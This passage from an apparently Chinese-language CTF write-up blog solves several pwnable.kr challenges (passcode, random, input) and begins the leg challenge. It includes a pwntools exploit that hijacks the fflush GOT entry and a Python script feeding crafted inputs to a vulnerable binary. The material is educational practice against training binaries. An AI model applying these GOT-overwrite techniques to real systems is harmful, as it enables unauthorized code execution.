</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;enter you name :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%100s&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Welcome %s!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>welcome</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nf>login</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// something after login...
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Now I can safely trust you that you have credential :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>直接输入 passcode 的话会显示段错误，显然是因为两个 <code>scanf</code> 都没有在变量前加 <code>&</code>，直接往变量值所代表的地址上写了。</p><p>换句话说，我们可以输入适当的 <code>passcode</code> 来控制两个局部变量的地址，使得他们等于那两个数值。而存储那两个数值的地址，只能来自于我们输入的 <code>name</code>。</p><p>然而这两个数值代表的地址未必可写，<code>name</code> 和两个 <code>passcode</code> 也位于不同栈帧，无法缓冲区溢出来覆盖。到这一步似乎卡住了。但经过反汇编发现 <code>name</code> 在 <code>ebp-0x70</code>，<code>passcode1</code> 在 <code>ebp-0x10</code>，两者相差 96 字节且位于同一栈帧，换句话说 <code>name</code> 是可以覆盖 <code>passcode1</code> 的，这样看似乎又有希望。</p><p>注意到 <code>login</code> 中，<code>scanf</code> 第一次后调用了 <code>fflush</code>。因此我们可以考虑利用 <code>scanf</code> 的写特性写 GOT 表，因为 GOT 表肯定是可写的。那么我们可以先用 <code>fflush</code> 的 GOT 地址（不止 <code>fflush</code>，程序中包含的 GLIBC 函数都行）覆盖 <code>passcode1</code> 的值，然后通过 <code>scanf</code> 对 <code>passcode1</code> 的<strong>值所代表的地址</strong>（也就是 <code>fflush</code> 的 GOT）写入 <code>system("/bin/cat flag")</code> 的地址。这样相当于将 <code>fflush</code> 函数劫持到了 <code>system("/bin/cat flag")</code> 上。</p><p><code>objdump -R passcode</code> 导出程序动态重定向表，拿到 <code>fflush</code> 的 GOT 地址 <code>0804a004</code>；然后 gdb 里 <code>disas login</code> 拿到 <code>system("/bin/cat flag")</code> 的地址 <code>080485e3</code>，<strong>注意</strong>这个地址实际上是 <code>call system</code> 的前一句：<code>movl $0x80487af,(%esp)</code>，也就是准备 <code>system</code> 函数的参数的语句。最后发 payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ python
</span></span><span class=line><span class=cl>&gt;&gt;&gt; from pwn import *
</span></span><span class=line><span class=cl>&gt;&gt;&gt; context.log_level <span class=o>=</span> <span class=s1>&#39;DEBUG&#39;</span>
</span></span><span class=line><span class=cl>&gt;&gt;&gt; <span class=nv>p</span> <span class=o>=</span> process<span class=o>(</span><span class=s1>&#39;./passcode&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>&gt;&gt;&gt; p.sendline<span class=o>(</span><span class=s1>&#39;a&#39;</span>*96+p32<span class=o>(</span>0x0804a004<span class=o>))</span>
</span></span><span class=line><span class=cl>&gt;&gt;&gt; p.sendline<span class=o>(</span>str<span class=o>(</span>0x080485e3<span class=o>))</span>
</span></span><span class=line><span class=cl>&gt;&gt;&gt; p.interactive<span class=o>()</span>
</span></span></code></pre></div><p>需要注意的是，<code>scanf</code> 的时候接收 <code>%d</code>，因此需要 <code>str</code> 一下转成十进制字符串。</p><blockquote><p>注：</p><ol><li>GLIBC 函数的 GOT 地址，在 pwntools 中可以用类似 <code>elf.got['fflush']</code> 的方法获得，更加方便</li><li>如果开启了 PIE 则需要 leak 出 GOT 地址。</li></ol></blockquote><h2 id=random class="relative group">random <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#random aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>random</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>random</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>        <span class=c1>// random value!
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>key</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>((</span><span class=n>key</span> <span class=o>^</span> <span class=n>random</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0xdeadbeef</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Good!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Wrong, maybe you should try 2^32 cases.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>我们都知道 C 的 <code>rand</code> 函数是伪随机，随机性取决于 <code>srand</code> 函数设定的种子，这个种子默认为 <code>1</code>。因此 <code>random</code> 变量实际上是固定的，只要在栈上把他读出来即可。</p><p><code>random</code> 是函数的局部变量，并且是 <code>unsigned int</code>，因此应该在 <code>ebp-4 的位置 </code>。我们在有 <code>deadbeef</code> 的那行下断点，随便输入后，在 gdb 中输入 <code>x/8x $rbp-4</code>，即可读取到：</p><pre tabindex=0><code>0x7ffefe6d5d0c: 0x6b8b4567      0x00400670      0x00000000      0x4439d830
0x7ffefe6d5d1c: 0x00007f68      0x00000001      0x00000000      0xfe6d5df8
</code></pre><p>也就是说，<code>0x6b8b4567</code> 就是这个 <code>random</code>，我们由此可以算出 <code>key</code> 为 <code>3039230856</code>。</p><h2 id=input class="relative group">input <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#input aria-label=锚点>#</a></span></h2><p>非常好玩的一题，涵盖了 Linux 下各种基本的通信方式。</p><p>先说一下这题的坑点：<code>/home/input</code> 下我们没有写权限，而 <code>/tmp</code> 目录下有写权限没有读权限，所以比较好的方法是在 <code>/tmp</code> 下新建个目录，把 flag 软链接（<code>ln -s /home/input2/flag ./flag</code>）到这个目录里，脚本放在同一目录下运行。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/socket.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;arpa/inet.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>*</span> <span class=n>envp</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Welcome to pwnable.kr</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Let&#39;s see if you know how to give input to program</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Just give me correct inputs then you will get the flag :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// argv
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>argc</span> <span class=o>!=</span> <span class=mi>100</span><span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=sc>&#39;A&#39;</span><span class=p>],</span><span class=s>&#34;</span><span class=se>\x00</span><span class=s>&#34;</span><span class=p>))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=sc>&#39;B&#39;</span><span class=p>],</span><span class=s>&#34;</span><span class=se>\x20\x0a\x0d</span><span class=s>&#34;</span><span class=p>))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Stage 1 clear!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// stdio
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>memcmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\x00\x0a\x00\xff</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>4</span><span class=p>))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nf>memcmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\x00\x0a\x02\xff</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>4</span><span class=p>))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Stage 2 clear!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// env
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\xca\xfe\xba\xbe</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>getenv</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\xde\xad\xbe\xef</span><span class=s>&#34;</span><span class=p>)))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Stage 3 clear!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// file
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>FILE</span><span class=o>*</span> <span class=n>fp</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\x0a</span><span class=s>&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>fp</span><span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>fread</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>fp</span><span class=p>)</span><span class=o>!=</span><span class=mi>1</span> <span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>memcmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\x00\x00\x00\x00</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span> <span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Stage 4 clear!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// network
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>sd</span><span class=p>,</span> <span class=n>cd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=n>saddr</span><span class=p>,</span> <span class=n>caddr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>sd</span> <span class=o>=</span> <span class=nf>socket</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>sd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;socket error, tell admin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>saddr</span><span class=p>.</span><span class=n>sin_family</span> <span class=o>=</span> <span class=n>AF_INET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>saddr</span><span class=p>.</span><span class=n>sin_addr</span><span class=p>.</span><span class=n>s_addr</span> <span class=o>=</span> <span class=n>INADDR_ANY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>saddr</span><span class=p>.</span><span class=n>sin_port</span> <span class=o>=</span> <span class=nf>htons</span><span class=p>(</span><span class=nf>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=sc>&#39;C&#39;</span><span class=p>])</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>bind</span><span class=p>(</span><span class=n>sd</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>saddr</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>saddr</span><span class=p>))</span> <span class=o>&lt;</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;bind error, use another port</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>listen</span><span class=p>(</span><span class=n>sd</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>c</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr_in</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>cd</span> <span class=o>=</span> <span class=nf>accept</span><span class=p>(</span><span class=n>sd</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>caddr</span><span class=p>,</span> <span class=p>(</span><span class=kt>socklen_t</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>cd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;accept error, tell admin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>recv</span><span class=p>(</span><span class=n>cd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>4</span> <span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>memcmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\xde\xad\xbe\xef</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>4</span><span class=p>))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Stage 5 clear!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// here&#39;s your flag
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>可以看到一共有 5 关：</p><ul><li>第一关要求有 100 个命令行参数，其中第 64 个是 <code>\x00</code>，第 65 个是 <code>\x20\x0a\x0d</code>；</li><li>第二关分别从标准输入和标准错误流中读取，要求读到的信息分别是 <code>\x00\x0a\x00\xff</code> 和 <code>\x00\x0a\x00\xff</code>，由于我们无法控制标准错误流，可以采用管道重定向的方式；</li><li>第三关需要我们设置环境变量 <code>\xde\xad\xbe\xef=\xca\xfe\xba\xbe</code>；</li><li>第四关读取一个文件，要求前四个字节是 <code>\x00\x00\x00\x00</code>；</li><li>第五关建立了一个 socket，监听的端口来自第 66 个命令行参数，且期望收到的消息是 <code>\xde\xad\xbe\xef</code>。</li></ul><p>编写 python 脚本：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># stage 1</span>
</span></span><span class=line><span class=cl><span class=n>args</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;/home/input2/input&#34;</span>
</span></span><span class=line><span class=cl><span class=n>args</span><span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=p>)]</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>args</span><span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;B&#39;</span><span class=p>)]</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x20\x0a\x0d</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>args</span><span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=s2>&#34;C&#34;</span><span class=p>)]</span> <span class=o>=</span> <span class=s2>&#34;8080&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># stage 2</span>
</span></span><span class=line><span class=cl><span class=n>stdin_r</span><span class=p>,</span> <span class=n>stdin_w</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>pipe</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>stderr_r</span><span class=p>,</span> <span class=n>stderr_w</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>pipe</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>stdin_w</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\x00\x0a\x00\xff</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>stderr_w</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\x00\x0a\x02\xff</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># stage 3</span>
</span></span><span class=line><span class=cl><span class=n>env</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;</span><span class=se>\xde\xad\xbe\xef</span><span class=s2>&#34;</span><span class=p>:</span> <span class=s2>&#34;</span><span class=se>\xca\xfe\xba\xbe</span><span class=s2>&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># stage 4</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x0a</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># open a subprocess here because we need a server</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>args</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>stdin_r</span><span class=p>,</span><span class=n>stderr</span><span class=o>=</span><span class=n>stderr_r</span><span class=p>,</span><span class=n>env</span><span class=o>=</span><span class=n>env</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># stage 5</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># wait 4 server</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>8080</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\xde\xad\xbe\xef</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=leg class="relative group">leg <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#leg aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>int</span> <span class=nf>key1</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=k>asm</span><span class=p>(</span><span class=s>&#34;mov r3, pc</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>key2</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=k>asm</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;push    {r6}</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;add    r6, pc, $1</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;bx    r6</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;.code   16</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;mov    r3, pc</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;add    r3, $0x4</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;push    {r3}</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;pop    {pc}</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;.code    32</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;pop    {r6}</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>key3</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=k>asm</span><span class=p>(</span><span class=s>&#34;mov r3, lr</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>key</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Daddy has very strong arm! :&#34;</span><span class=p>);</span>
